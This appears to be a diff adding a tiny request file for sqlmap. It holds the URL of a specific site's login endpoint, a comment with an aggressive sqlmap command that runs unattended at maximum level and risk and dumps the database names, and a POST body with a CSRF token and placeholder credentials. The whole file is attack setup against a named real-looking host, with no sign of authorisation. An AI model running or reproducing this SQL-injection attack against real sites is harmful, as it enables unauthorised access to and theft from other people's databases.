@@ -1,0 +1,3 @@
+http://alscheift.my.id:80/login (POST)  # C:\Programs\sqlmap\sqlmap.py -r ./safe_login --batch --dbs --level=5 --risk=3 --output-dir=.\output\safe
+
+_token=yUdY2sML1D2AcubWFdRdegleIFy7IqMSNEj6XoRy&email=username&password=password
